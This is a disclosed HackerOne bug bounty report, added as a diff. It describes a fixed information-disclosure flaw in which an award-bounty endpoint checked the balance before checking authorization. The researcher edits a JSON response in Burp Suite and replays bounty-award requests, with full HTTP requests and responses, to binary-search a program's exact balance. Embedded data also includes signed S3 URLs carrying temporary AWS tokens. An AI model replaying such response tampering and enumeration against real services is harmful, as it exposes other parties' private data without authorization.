@@ -1,0 +1,199 @@
+ReportLink:https://hackerone.com/reports/293593
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/cjlegacion
+ReportedTo:HackerOne(security)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:06.12.2017 18:41:46
+
+Summary:
+The finder found a vulnerability that allowed them to determine the available bounty balance of some programs. The endpoint that awards a bounty did a balance check before the authorization check and returned an error when the program had insufficient funds. Someone could iterate over all report IDs and try to award a number of bounties to narrow down the balance. The program names were only accessible for public programs. This vulnerability only affected a limited set of our customers.
+
+We'd like to thank @cyriac and @cjlegacion for bringing this vulnerability to our attention!
+Hello HackerOne,
+I found a way to check the exact bounty balance of any bug bounty program.
+
+
+### Steps To Reproduce
+
+1. Report to any program that giving a bounty
+2. Go to your `Inbox`
+3. Open the Burp Suite before you click the report you created for your target bug bounty program.
+4. Click the `Intercept is off` to make it `on`, click the report you created and wait for the request like this.
+
+Request:
+
+```
+GET /reports/240273.json HTTP/1.1
+Host: hackerone.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Referer: https://hackerone.com/bugs?subject=user&report_id=238941&view=all&substates%5B%5D=pre-submission&substates%5B%5D=new&substates%5B%5D=triaged&substates%5B%5D=needs-more-info&substates%5B%5D=resolved&substates%5B%5D=informative&substates%5B%5D=not-applicable&substates%5B%5D=duplicate&substates%5B%5D=spam&reported_to_team=&text_query=&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=25&page=1
+X-Requested-With: XMLHttpRequest
+Connection: close
+```
+
+5. Once you see the request above. Go to your Burp Suite, click "Do Intercept" > "Response to this Request" and edit the response.
+
+Response:
+
+```
+HTTP/1.1 200 OK
+Date: Tue, 28 Nov 2017 20:33:14 GMT
+Content-Type: application/json; charset=utf-8
+Connection: close
+Cache-Control: private, no-cache, no-store, must-revalidate
+Content-Disposition: inline; filename="response.json"
+Content-Security-Policy: default-src 'none'; base-uri 'self'; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; frame-src www.youtube-nocookie.com; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-attachments.s3.amazonaws.com; media-src 'self' hackerone-attachments.s3.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
+Referrer-Policy: strict-origin-when-cross-origin
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 1; mode=block
+Server: cloudflare-nginx
+CF-RAY: 3c5019db6afc60ae-MNL
+Content-Length: 9669
+
+{"id":240273,"url":"https://hackerone.com/reports/240273","title":"Possible Unsubscribing any Subscribed Email in https://ma.hacker.one/UnsubscribePage.html","state":"Closed","substate":"duplicate","severity_rating":"none","readable_substate":"Duplicate","created_at":"2017-06-15T16:57:36.209Z","reporter":{"disabled":false,"username":"cjlegacion","url":"/cjlegacion","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/production/000/085/516/e2e8fec8cd989093705ee650bb427da37486ea90_small.jpg?1500409739"},"is_me?":true,"hacker_mediation":true},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/production/000/000/013/68fea1fe00dc833f4109e015738af4b374727e56_small.png?1445331713","medium":"https://profile-photos.hackerone-user-content.com/production/000/000/013/28af2ada2cc00aa9427504fc5a14f587362df84b_medium.png?1445331713"},"permissions":[],"default_currency":"usd","awards_miles":false,"state":"public_mode","program_health_enabled":true,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"is_external_bug":false,"is_participant":true,"stage":3,"public":false,"visibility":"private","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":null,"bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":null,"comments_closed?":false,"vulnerability_information":"Hello HackerOne,\n\nI found that if the attacker are going to unsubscribe his/her email in the subscription list \n\n### Steps To Reproduce\n\n1. Go to https://www.hackerone.com/zerodaily/ and subscribe your email\n2. Wait for the email and Check the word \"Unsubscribe\" in email\n3. Now you are going to get an URL Link:https://ma.hacker.one/UnsubscribePage.html?mkt_unsubscribe=1\u0026mkt_tok=*\n4. Even the attacker are going to delete the parameter \"mkt_tok\" it's still able to put an email and unsubcribe the target email\n\nKindly check the attached photo\n\nThanks,\nCj Legacion\n","vulnerability_information_html":"\u003cp\u003eHello HackerOne,\u003c/p\u003e\n\n\u003cp\u003eI found that if the attacker are going to unsubscribe his/her email in the subscription list \u003c/p\u003e\n\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps To Reproduce\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003eGo to \u003ca title=\"https://www.hackerone.com/zerodaily/\" href=\"/redirect?signature=4b8feec9f3a061cff971be82417f622694e9baba\u0026amp;url=https%3A%2F%2Fwww.hackerone.com%2Fzerodaily%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.hackerone.com/zerodaily/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and subscribe your email\u003c/li\u003e\n\u003cli\u003eWait for the email and Check the word \u0026quot;Unsubscribe\u0026quot; in email\u003c/li\u003e\n\u003cli\u003eNow you are going to get an URL Link:\u003ca title=\"https://ma.hacker.one/UnsubscribePage.html?mkt_unsubscribe=1\u0026amp;mkt_tok=*\" href=\"/redirect?signature=4523826e173df9b36c7a94849905f85c55ec252b\u0026amp;url=https%3A%2F%2Fma.hacker.one%2FUnsubscribePage.html%3Fmkt_unsubscribe%3D1%26mkt_tok%3D%2A\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://ma.hacker.one/UnsubscribePage.html?mkt_unsubscribe=1\u0026amp;mkt_tok=*\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eEven the attacker are going to delete the parameter \u0026quot;mkt_tok\u0026quot; it\u0026#39;s still able to put an email and unsubcribe the target email\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eKindly check the attached photo\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nCj Legacion\u003c/p\u003e\n","weakness":{"id":12,"name":"Array Index Underflow"},"original_report_id":225627,"original_report_url":"https://hackerone.com/reports/225627","attachments":[{"id":194617,"file_name":"PossibleUnsubscribingTargetEmail1.png","expiring_url":"https://hackerone-attachments.s3.amazonaws.com/production/000/194/617/fb153cb18f55ba9fb45dcbf125b195e2be9e523d/PossibleUnsubscribingTargetEmail1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAJYQ7TICTUZIISV2Q%2F20171128%2Fus-east-1%2Fs3%2Faws4_request\u0026X-Amz-Date=20171128T203313Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=FQoDYXdzEKr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDGPgOqGbwjAq%2Bu0jCyK3A%2FaUXmC9H8EKubiokU3lDumFQZtDp77H6DaZxKahUYXX5cYhrxRv5m0kUqVBfnHQgq4JWZnQtKE6FEJNf4RzLaN4NPbhhrKRAMWrqiskcDToWRBeAun1M5Yse3viPWqKY5kO%2FsSC7tzn5U78TP%2By18rK4jhoVsAu7q3RlqOCMWXltdeccKT96smYgJ6QmazLJ3NifvaSWj%2BtcVXpBNwszq7BdOLNLEqEH7izbBJF0g8SPS%2F36qPAAdO53sNvX6gmOfFaI5hhK9PPEKtM5J4t7Pn447g8O3aPiUdSfFeGyh%2BsQW%2FoDb5BFkz68SYpqWCRhOXGnoRsX%2BjmkKkECBrAckE2xdT79MK%2Brq3LePXNeWW2jujW8EHMefCmcuxutAUjLfjb%2FlDiCbytnjifXZWP8cpdK9yec5x6%2BHrtJ%2BauXffVtkIlg1NfiLk7ST98WNVmSGdUj1t6VViWx1ySHCdkEnKv7hn8Mnt499E0VAlUoUPKVwMZeQTXJ3yI%2B4caqguZrVxLHNRjPoX%2FaEQGEDcQfSHbTWQ%2FtLZzfxFYf7MReIX5%2FQPQPe20qOtv%2Bo%2F2jGdN704eipgCdEYok5320AU%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b2c9c2c0dd4235de7d6b0b97270d3760ecb2a59b578bb18ff1ae38b12fbd0b78","type":"image/png"},{"id":194618,"file_name":"PossibleUnsubscribingTargetEmail.png","expiring_url":"https://hackerone-attachments.s3.amazonaws.com/production/000/194/618/403a5c7e9e41256491665c07e4f34b0271a52796/PossibleUnsubscribingTargetEmail.png?X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAJYQ7TICTUZIISV2Q%2F20171128%2Fus-east-1%2Fs3%2Faws4_request\u0026X-Amz-Date=20171128T203313Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=FQoDYXdzEKr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDGPgOqGbwjAq%2Bu0jCyK3A%2FaUXmC9H8EKubiokU3lDumFQZtDp77H6DaZxKahUYXX5cYhrxRv5m0kUqVBfnHQgq4JWZnQtKE6FEJNf4RzLaN4NPbhhrKRAMWrqiskcDToWRBeAun1M5Yse3viPWqKY5kO%2FsSC7tzn5U78TP%2By18rK4jhoVsAu7q3RlqOCMWXltdeccKT96smYgJ6QmazLJ3NifvaSWj%2BtcVXpBNwszq7BdOLNLEqEH7izbBJF0g8SPS%2F36qPAAdO53sNvX6gmOfFaI5hhK9PPEKtM5J4t7Pn447g8O3aPiUdSfFeGyh%2BsQW%2FoDb5BFkz68SYpqWCRhOXGnoRsX%2BjmkKkECBrAckE2xdT79MK%2Brq3LePXNeWW2jujW8EHMefCmcuxutAUjLfjb%2FlDiCbytnjifXZWP8cpdK9yec5x6%2BHrtJ%2BauXffVtkIlg1NfiLk7ST98WNVmSGdUj1t6VViWx1ySHCdkEnKv7hn8Mnt499E0VAlUoUPKVwMZeQTXJ3yI%2B4caqguZrVxLHNRjPoX%2FaEQGEDcQfSHbTWQ%2FtLZzfxFYf7MReIX5%2FQPQPe20qOtv%2Bo%2F2jGdN704eipgCdEYok5320AU%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=06ddc03b66fc3de4980d490b5bb11a09bf55846d6baec118ef5e9e6b23199f28","type":"image/png"}],"severity":{"rating":"none","author_type":"User"},"structured_scope":{"databaseId":3,"asset_type":"URL","asset_identifier":"https://hackerone.com","max_severity":"critical"},"abilities":{"can_manage?":false,"can_export?":false,"can_add_comment?":true,"can_change_state?":false,"can_reopen?":false,"can_award_bounty?":false,"can_award_swag?":false,"can_suggest_bounty_amount?":false,"can_assign_to_user?":false,"can_hide_timeline?":false,"can_agree_on_going_public?":true,"can_be_publicly_disclosed?":false,"can_post_internal_comments?":false,"can_manage_common_responses?":false,"can_use_common_responses?":false,"can_reassign_to_team?":false,"can_change_title?":false,"can_change_weakness?":false,"can_be_manually_disclosed?":false,"can_clone?":false,"can_close?":false,"can_ban_researcher?":false,"can_create_severity?":false,"can_close_comments?":false,"can_change_structured_scope?":false,"can_manage_collaborators?":false,"can_view_bounty_weights?":true,"can_redact?":false,"assignable_team_members":[],"assignable_team_member_groups":[]},"is_member_of_team?":false,"activities":[{"id":1759787,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Hi @cjlegacion,\n\nThis is a duplicate of #225627.\n\nCheers!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/cjlegacion\"\u003e@cjlegacion\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThis is a duplicate of \u003ca href=\"/reports/225627\"\u003e#225627\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eCheers!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-15T22:30:57.230Z","updated_at":"2017-06-15T22:30:57.230Z","original_report_id":225627,"actor":{"username":"asuka","url":"/asuka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/production/000/111/923/c73a42c0f9ea47ce5554fbab2411978f2bb985f8_medium.jpg?1474068574"}},"genius_execution_id":null,"team_handle":"security"},{"id":1760238,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hello @asuka,\n\nCan i filed a duplicate report in #225627 ?\n\nThanks","markdown_message":"\u003cp\u003ehello \u003ca href=\"/asuka\"\u003e@asuka\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eCan i filed a duplicate report in \u003ca href=\"/reports/225627\"\u003e#225627\u003c/a\u003e ?\u003c/p\u003e\n\n\u003cp\u003eThanks\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-16T04:06:49.938Z","updated_at":"2017-06-16T04:06:49.938Z","actor":{"username":"cjlegacion","url":"/cjlegacion","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/production/000/085/516/d7206b4f9856baf1f3f8d30cf1650fe3f55b9bca_medium.jpg?1500409739"}},"genius_execution_id":null,"team_handle":"security"}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":true}]}
+```
+
+6. Change the value of parameter name `can_award_bounty?` from `false` to `true`
+Note: I change the response of the request so i'm able to use the `Set award` for the request .
+7. Use the `Set award` and intercept the request and put that request to `Repeater`.
+
+Request:
+
+```
+POST /reports/bulk HTTP/1.1
+Host: hackerone.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Referer: https://hackerone.com/bugs?subject=user&report_id=240273&view=all&substates%5B%5D=pre-submission&substates%5B%5D=new&substates%5B%5D=triaged&substates%5B%5D=needs-more-info&substates%5B%5D=resolved&substates%5B%5D=informative&substates%5B%5D=not-applicable&substates%5B%5D=duplicate&substates%5B%5D=spam&reported_to_team=&text_query=&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=25&page=1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 174
+Connection: close
+
+message=&substate=bounty-award&bounty_amount=500&reference=&add_reporter_to_original=false&reply_action=set-bounty&reports_count=1&report_ids%5B%5D=240273&bounty_currency=USD
+```
+Response:
+
+```
+HTTP/1.1 200 OK
+Date: Tue, 28 Nov 2017 20:39:58 GMT
+Content-Type: application/json; charset=utf-8
+Connection: close
+Cache-Control: private, no-cache, no-store, must-revalidate
+Content-Disposition: inline; filename="response."
+Content-Security-Policy: default-src 'none'; base-uri 'self'; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; frame-src www.youtube-nocookie.com; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-attachments.s3.amazonaws.com; media-src 'self' hackerone-attachments.s3.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
+Referrer-Policy: strict-origin-when-cross-origin
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 1; mode=block
+Server: cloudflare-nginx
+CF-RAY: 3c5023b59bf660c0-MNL
+Content-Length: 64
+
+{"flash":"You have successfully awarded a bounty.","reports":[]}
+```
+
+As you can see here it's showing that `"You have successfully awarded a bounty"` on the response but try to make value of parameter name `bounty_amount` higher that on the request above. By use of that you can actually check the exact bounty balance of the bug bounty program .
+
+Request with the exact bounty balance of the "HackerOne Program":
+
+```
+POST /reports/bulk HTTP/1.1
+Host: hackerone.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Referer: https://hackerone.com/bugs?subject=user&report_id=240273&view=all&substates%5B%5D=pre-submission&substates%5B%5D=new&substates%5B%5D=triaged&substates%5B%5D=needs-more-info&substates%5B%5D=resolved&substates%5B%5D=informative&substates%5B%5D=not-applicable&substates%5B%5D=duplicate&substates%5B%5D=spam&reported_to_team=&text_query=&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=25&page=1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 176
+Connection: close
+
+message=&substate=bounty-award&bounty_amount=31730&reference=&add_reporter_to_original=false&reply_action=set-bounty&reports_count=1&report_ids%5B%5D=240273&bounty_currency=USD
+```
+Response with the exact bounty balance of the "HackerOne Program":
+
+```
+HTTP/1.1 200 OK
+Date: Tue, 28 Nov 2017 20:43:14 GMT
+Content-Type: application/json; charset=utf-8
+Connection: close
+Cache-Control: private, no-cache, no-store, must-revalidate
+Content-Disposition: inline; filename="response."
+Content-Security-Policy: default-src 'none'; base-uri 'self'; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; frame-src www.youtube-nocookie.com; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-attachments.s3.amazonaws.com; media-src 'self' hackerone-attachments.s3.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
+Referrer-Policy: strict-origin-when-cross-origin
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 1; mode=block
+Server: cloudflare-nginx
+CF-RAY: 3c502882d8246102-MNL
+Content-Length: 64
+
+{"flash":"You have successfully awarded a bounty.","reports":[]}
+```
+
+Try to make it higher to the exact bounty balance of the "HackerOne Program"
+
+Request with higher than the exact bounty balance of the "HackerOne Program":
+
+```
+POST /reports/bulk HTTP/1.1
+Host: hackerone.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Referer: https://hackerone.com/bugs?subject=user&report_id=240273&view=all&substates%5B%5D=pre-submission&substates%5B%5D=new&substates%5B%5D=triaged&substates%5B%5D=needs-more-info&substates%5B%5D=resolved&substates%5B%5D=informative&substates%5B%5D=not-applicable&substates%5B%5D=duplicate&substates%5B%5D=spam&reported_to_team=&text_query=&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=25&page=1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 176
+Connection: close
+
+message=&substate=bounty-award&bounty_amount=31731&reference=&add_reporter_to_original=false&reply_action=set-bounty&reports_count=1&report_ids%5B%5D=240273&bounty_currency=USD
+```
+
+Response with higher than the exact bounty balance of the "HackerOne Program":
+
+```
+HTTP/1.1 422 Unprocessable Entity
+Date: Tue, 28 Nov 2017 20:45:47 GMT
+Content-Type: application/json; charset=utf-8
+Connection: close
+Cache-Control: private, no-cache, no-store, must-revalidate
+Content-Disposition: inline; filename="response."
+Content-Security-Policy: default-src 'none'; base-uri 'self'; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; frame-src www.youtube-nocookie.com; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-attachments.s3.amazonaws.com; media-src 'self' hackerone-attachments.s3.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
+Referrer-Policy: strict-origin-when-cross-origin
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 1; mode=block
+Server: cloudflare-nginx
+CF-RAY: 3c502c3d7bd86102-MNL
+Content-Length: 101
+
+{"flash":null,"reports":[{"errors":["Validation failed: insufficient funds to award this bounty."]}]}
+```
+
+As you can see on the response it's showing `"Validation failed: insufficient funds to award this bounty."`
+So that's how i found a way to check the bounty balance of the bug bounty program.
+
+PS. Even you saw the response `"flash":"You have successfully awarded a bounty."` . It's actually not sent to my account or recorded to my account. Also if it's worked maybe i'm gonna be `RICH` now Lol.
+
+Thanks,
+@cjlegacion
+
+## Impact
+
+The attacker are able to see the exact bounty balance of the bug bounty program even the attacker don't have an access on the program.
